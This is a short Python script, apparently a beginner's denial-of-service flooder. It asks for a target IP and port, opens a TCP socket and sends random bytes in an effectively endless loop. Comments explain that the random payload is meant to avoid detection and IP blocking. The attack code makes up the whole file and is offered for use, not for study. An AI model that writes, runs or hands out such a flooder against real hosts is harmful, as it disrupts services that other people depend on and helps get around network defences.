import socket
import random


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = input("Target IP: ")
Port = int(input("Target Port: "))

s.connect((IP, Port))

#Creating a for loop with 200 to the power of 2000 which basically means a loop that runs for infinity.
for i in range(1, 200**2000):
    s.send(random._urandom(20))
    print(f"Send: {i}", end='\r')

#random._urandom(size) Basically we're sending random bytes to avoid being detected and getting IP blocked.

#an f-string is a literal string, prefixed with f , which contains expressions inside braces. The expressions are replaced with their values.”

#Without end='\r' we'll get multiple line of send=1 send=2 etc.. with end='\r' we get one send line with changing values.







